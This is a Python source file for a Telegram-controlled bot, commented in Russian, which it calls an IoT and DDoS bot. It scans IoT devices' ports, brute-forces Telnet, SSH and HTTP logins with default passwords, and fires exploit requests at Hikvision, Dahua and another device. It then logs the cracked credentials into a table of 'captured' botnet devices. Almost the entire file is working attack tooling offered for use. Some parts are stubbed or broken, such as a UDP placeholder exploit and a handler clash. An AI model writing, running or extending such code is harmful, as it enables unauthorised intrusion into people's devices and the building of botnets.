#!/usr/bin/env python3
# ============================================================================
#   ULTIMATE IoT + DDoS BOT — ВСЁ В ОДНОМ
#   (Hydra, Metasploit, эксплойты, ботнет, отчёты)
# ============================================================================

import os
import sys
import asyncio
import aiohttp
import random
import logging
import socket
import telnetlib
import paramiko
import json
import sqlite3
import subprocess
import time
import re
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "YOUR_BOT_TOKEN"               # замени
ADMIN_IDS = [8313963542]                    # твой ID
THREADS = 50                                 # потоков для брутфорса

# ===== БАЗА ДАННЫХ =====
conn = sqlite3.connect("bot.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS devices (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT UNIQUE,
    port INTEGER,
    user TEXT,
    pass TEXT,
    exploit TEXT,
    added TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS attacks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target TEXT,
    method TEXT,
    duration INTEGER,
    status TEXT,
    started TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

# ===== ЛОГИРОВАНИЕ =====
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ===== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =====
active_attacks = {}
proxy_list = []

# ===== ЗАГРУЗКА ПРОКСИ =====
async def load_proxies():
    try:
        with open("proxies.txt", "r") as f:
            proxy_list.extend([line.strip() for line in f if line.strip()])
        logger.info(f"✅ Загружено {len(proxy_list)} прокси")
    except:
        pass

def get_random_proxy():
    return random.choice(proxy_list) if proxy_list else None

# ===== БРУТФОРС (TELNET, SSH, HTTP) =====
def brute_telnet(ip, port=23):
    for login in ["root", "admin", "user"]:
        for passwd in ["root", "admin", "12345", "password", "123456"]:
            try:
                tn = telnetlib.Telnet(ip, port, timeout=3)
                tn.read_until(b"login: ", timeout=3)
                tn.write(login.encode() + b"\n")
                tn.read_until(b"Password: ", timeout=3)
                tn.write(passwd.encode() + b"\n")
                time.sleep(1)
                out = tn.read_some()
                tn.close()
                if b"# " in out or b"$ " in out:
                    return login, passwd
            except:
                continue
    return None, None

def brute_ssh(ip, port=22):
    for login in ["root", "admin", "user"]:
        for passwd in ["root", "admin", "12345", "password", "123456"]:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=login, password=passwd, timeout=3)
                client.close()
                return login, passwd
            except:
                continue
    return None, None

async def brute_http(ip, port=80):
    for login in ["admin", "root", "user"]:
        for passwd in ["admin", "12345", "password", "123456"]:
            try:
                auth = aiohttp.BasicAuth(login, passwd)
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"http://{ip}:{port}", auth=auth, timeout=2) as resp:
                        if resp.status == 200:
                            return login, passwd
            except:
                continue
    return None, None

# ===== ЭКСПЛОЙТЫ =====
async def hikvision_rce(ip):
    url = f"http://{ip}/cgi-bin/ConfigManager.cgi?action=command&command=id"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=5) as resp:
                text = await resp.text()
                if "uid=" in text:
                    return True, "Hikvision RCE успешен"
                return False, "Не уязвим"
    except:
        return False, "Ошибка подключения"

async def dahua_auth_bypass(ip):
    url = f"http://{ip}/cgi-bin/userManager.cgi?action=getUserList"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, auth=aiohttp.BasicAuth('admin', ''), timeout=5) as resp:
                text = await resp.text()
                if "UserList" in text:
                    return True, "Dahua доступ получен"
                return False, "Не уязвим"
    except:
        return False, "Ошибка подключения"

async def tichome_exploit(ip):
    # CVE-2026-26478 – отправка UDP пакета (заглушка)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"\x00"*100, (ip, 35670))
        sock.close()
        return True, "Эксплойт отправлен. Если устройство уязвимо, оно должно откликнуться."
    except:
        return False, "Ошибка отправки"

# ===== SCANNER =====
async def scan_ports(ip):
    open_ports = []
    for port in [22, 23, 80, 443, 554, 8080, 8081, 8443]:
        try:
            _, writer = await asyncio.open_connection(ip, port, timeout=1)
            writer.close()
            await writer.wait_closed()
            open_ports.append(port)
        except:
            continue
    return open_ports

async def auto_exploit(ip):
    ports = await scan_ports(ip)
    result = {"ip": ip, "ports": ports, "exploits": []}

    if 80 in ports or 8080 in ports:
        succ, msg = await hikvision_rce(ip)
        if succ:
            result["exploits"].append({"type": "hikvision", "details": msg})
        succ, msg = await dahua_auth_bypass(ip)
        if succ:
            result["exploits"].append({"type": "dahua", "details": msg})

    if 23 in ports:
        login, pwd = await asyncio.to_thread(brute_telnet, ip)
        if login:
            result["exploits"].append({"type": "telnet", "creds": f"{login}:{pwd}"})
            cursor.execute("INSERT OR IGNORE INTO devices (ip, port, user, pass) VALUES (?,?,?,?)",
                          (ip, 23, login, pwd))
            conn.commit()

    if 22 in ports:
        login, pwd = await asyncio.to_thread(brute_ssh, ip)
        if login:
            result["exploits"].append({"type": "ssh", "creds": f"{login}:{pwd}"})
            cursor.execute("INSERT OR IGNORE INTO devices (ip, port, user, pass) VALUES (?,?,?,?)",
                          (ip, 22, login, pwd))
            conn.commit()

    if 35670 in ports:
        succ, msg = await tichome_exploit(ip)
        if succ:
            result["exploits"].append({"type": "tichome", "details": msg})

    return result

# ===== TELEGRAM BOT =====
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class ScanStates(StatesGroup):
    waiting_for_target = State()

def main_keyboard():
    kb = InlineKeyboardBuilder()
    kb.button(text="🔍 Сканировать IP", callback_data="scan_ip")
    kb.button(text="📡 Авто-эксплойт", callback_data="auto_exploit")
    kb.button(text="🤖 Ботнет", callback_data="botnet")
    kb.button(text="📊 Статус", callback_data="status")
    kb.adjust(2)
    return kb.as_markup()

def is_admin(user_id):
    return user_id in ADMIN_IDS

@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Доступ запрещён.")
        return
    await message.answer("🔥 **Ultimate IoT Bot** 🔥\nВыбери действие:", reply_markup=main_keyboard())

@dp.callback_query(F.data == "scan_ip")
async def scan_ip(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Введи IP для сканирования портов:")
    await state.set_state(ScanStates.waiting_for_target)

@dp.message(ScanStates.waiting_for_target)
async def process_scan(message: Message, state: FSMContext):
    ip = message.text.strip()
    await message.answer(f"⏳ Сканирую {ip}...")
    ports = await scan_ports(ip)
    if ports:
        await message.answer(f"📡 Открытые порты: {', '.join(map(str, ports))}")
    else:
        await message.answer("❌ Нет открытых портов.")
    await state.clear()

@dp.callback_query(F.data == "auto_exploit")
async def auto_exploit_cmd(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Введи IP для автоматической атаки:")
    await state.set_state(ScanStates.waiting_for_target)

@dp.message(ScanStates.waiting_for_target)
async def process_auto_exploit(message: Message, state: FSMContext):
    ip = message.text.strip()
    await message.answer(f"⏳ Запускаю авто-эксплойт на {ip}...")
    result = await auto_exploit(ip)

    if result["exploits"]:
        text = f"✅ **Успешно для {ip}**\n\n"
        for e in result["exploits"]:
            text += f"• {e['type'].upper()}: {e.get('creds', e.get('details'))}\n"
    else:
        text = f"❌ Ничего не найдено для {ip}"

    await message.answer(text)
    await state.clear()

@dp.callback_query(F.data == "botnet")
async def show_botnet(callback: CallbackQuery):
    cursor.execute("SELECT ip, port, user, pass FROM devices")
    devices = cursor.fetchall()
    if not devices:
        await callback.message.edit_text("🤖 Ботнет пуст.")
    else:
        text = "🤖 **Захваченные устройства:**\n\n"
        for d in devices:
            text += f"• {d[0]}:{d[1]} – {d[2]}:{d[3]}\n"
        await callback.message.edit_text(text, reply_markup=main_keyboard())

@dp.callback_query(F.data == "status")
async def show_status(callback: CallbackQuery):
    cursor.execute("SELECT COUNT(*) FROM devices")
    count = cursor.fetchone()[0]
    await callback.message.edit_text(
        f"📊 **Статус**\n\n"
        f"Захваченных устройств: {count}\n"
        f"Активных атак: {len(active_attacks)}",
        reply_markup=main_keyboard()
    )

# ===== ЗАПУСК =====
async def main():
    await load_proxies()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
